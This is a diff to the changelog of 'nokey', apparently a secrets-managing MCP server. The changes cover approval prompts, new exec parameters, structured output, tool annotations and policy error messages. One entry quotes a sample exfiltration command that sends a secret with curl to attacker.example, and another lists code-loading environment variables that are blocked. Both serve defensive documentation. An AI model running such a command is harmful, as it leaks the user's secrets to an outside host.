@@ -92,7 +92,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   `*`) instead.
 - Approval prompts now show what is being approved, not just a command
   name. `exec` and `exec_with_secrets` list the arguments (quoted, with
-  `${{NOKEY:…}}` placeholders shown unresolved, capped at 512 bytes), so
+  `${{NOKEY:…}}` placeholders shown unresolved, capped at 512 bytes with
+  a note of how many bytes and arguments were cut), so
   `curl https://attacker.example -H "X: ${{NOKEY:KEY}}"` no longer reads
   as a plain "curl wants KEY". `mint_token` shows the requested `for`,
   TTL and max uses, the auto-minted session token is described as
@@ -108,6 +109,37 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   the audit log instead of the ID itself.
 
 ### Added
+- `nokey mcp serve` sends server instructions at initialize: call
+  `list_secrets` first, prefer `exec_with_secrets` placeholders over
+  `exec`'s environment injection, how approval prompts and `mint_token`
+  fit in, and the policy command name the GitHub tools are checked
+  against.
+- The MCP server recovers from a panic in a tool handler and returns it
+  as an error for that call, instead of exiting and dropping the
+  session.
+- `exec` and `exec_with_secrets` take four optional parameters: `cwd`
+  (an absolute, existing directory to run in; the command must then be
+  a bare name or an absolute path), `stdin` (text fed to the command,
+  which otherwise still gets none), `env` (extra non-secret variables;
+  stored secret names are rejected, since their values would not be
+  redacted, as are variables that change what code a program loads or
+  runs, such as `PATH`, `LD_*`, `DYLD_*`, `BASH_ENV`, `NODE_OPTIONS`,
+  `PYTHON*` and `GIT_SSH*`) and `separate_stderr` (stderr returned after
+  stdout under a `[stderr]` line, each stream redacted separately and
+  given half of the 1 MiB output limit). When any of them is set, the approval prompt shows the
+  cwd, the env entries and a preview of stdin. Leaving them out runs
+  exactly as before.
+- `exec` and `exec_with_secrets` declare an output schema and return
+  structured content next to their unchanged text: `output`, `stderr`
+  (when split), `exit_code`, `timed_out`, `truncated`, `original_bytes`
+  and `secrets_injected`. Clients that read structured results no longer
+  have to parse the `[exit code: N]` prefix or guess whether output was
+  cut.
+- `github_list_issues` and `github_list_prs` take an optional `page`, so
+  results past the first page are reachable without falling back to
+  `github_api`. `github_get_file` takes an optional `raw` that returns
+  the file's contents directly instead of JSON metadata with
+  base64-encoded content.
 - `nokey import --dry-run FILE` parses the file and lists the secret
   names it would import, flagging any the keyring would reject, without
   opening the keyring or writing anything.
@@ -138,6 +170,14 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   hint, which opened the keyring on every Tab press.
 
 ### Changed
+- Every MCP tool now has a title and annotation hints that match what it
+  does. mcp-go defaults a tool with no annotations to destructive and
+  open-world, so clients showed all six GitHub tools, `mint_token` and
+  the proxy tools as destructive, and `list_secrets`/`list_tokens` as
+  reaching the outside world. The read-only GitHub tools are now marked
+  read-only, the create tools and `mint_token` non-destructive, the proxy
+  tools and `revoke_token` idempotent, and only `exec`,
+  `exec_with_secrets` and `github_api` keep the destructive default.
 - `nokey status` validates `config.yaml` strictly, so a file with an
   unknown (for example misspelled) key is now reported as
   `config: error: ...` rather than `valid`, even though the rest of
@@ -148,6 +188,25 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   only when it is present, and the redacting reader reuses its read
   buffer. On a 64 KiB chunk with four secrets this goes from 2.4 MB and
   65 allocations to none, and runs about 1.8x faster.
+- MCP errors now say how to get past them. A policy denial from `exec`,
+  `exec_with_secrets` or a GitHub tool is followed by the rule the user
+  could add and the path of `policies.yaml`; the token-required error
+  names the `mint_token` secrets and `for` value to use; and the
+  only/except conflict no longer refers to `--only`/`--except` flags
+  that MCP callers don't have. Each message still starts with the same
+  words (`policy denied:`, `token required by policy`, `cannot use
+  both`), and policy denials are audited as before.
+- The policy command name the MCP GitHub tools are checked under,
+  `nokey:integration:github`, is now documented in the README, the
+  `nokey init` starter policy and `examples/policies.yaml` (as a
+  commented-out rule, so new policies behave as before). Until now it
+  appeared only in the roadmap, so any `policies.yaml` quietly disabled
+  the GitHub tools.
+- The README's MCP setup and `nokey mcp --help` now use
+  `claude mcp add` / `.mcp.json` instead of the
+  `~/.claude/claude_code_config.json` file current Claude Code no longer
+  reads, and the help describes the policy, approval and token gates
+  rather than only the keyring ACL.
 
 ### Fixed
 - `nokey proxy` and `--isolate` shutdown can no longer hang. A client
